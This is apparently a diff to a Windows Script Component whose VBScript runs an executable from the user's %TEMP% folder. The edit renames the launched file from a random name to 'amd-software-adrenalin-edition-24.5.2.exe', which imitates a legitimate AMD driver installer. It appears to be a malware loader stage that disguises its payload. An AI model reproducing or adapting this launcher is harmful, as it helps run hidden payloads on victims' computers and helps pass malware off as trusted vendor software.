@@ -1,6 +1,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\PrettyOught.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\amd-software-adrenalin-edition-24.5.2.exe")
 </script>
 </component>
